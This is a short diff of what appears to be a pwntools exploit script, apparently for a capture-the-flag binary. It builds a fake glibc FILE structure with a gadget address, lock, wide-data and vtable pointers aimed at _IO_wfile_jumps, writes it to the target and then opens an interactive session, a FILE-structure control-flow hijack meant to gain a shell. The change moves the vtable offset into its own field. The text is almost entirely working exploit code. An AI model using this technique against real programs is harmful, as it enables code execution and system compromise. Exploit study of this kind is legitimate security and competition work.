@@ -174,7 +174,8 @@ fake._IO_save_base = glibc_base_addr+next(glibc_e.search(asm('add rdi, 0x10; jmp
 fake._lock = glibc_base_addr+glibc_e.symbols['_IO_stdfile_1_lock']
 fake._codecvt = glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0xb8
 fake._wide_data = glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0x200
-fake.unknown2 = p64(0)*2+p64(glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0x20)+p64(0)*3+p64(glibc_base_addr+glibc_e.symbols['_IO_wfile_jumps']-0x18)
+fake.unknown2 = p64(0)*2+p64(glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0x20)+p64(0)*3
+fake.vtable = glibc_base_addr+glibc_e.symbols['_IO_wfile_jumps']-0x18
 write(14, bytes(fake))
 
 p.interactive()
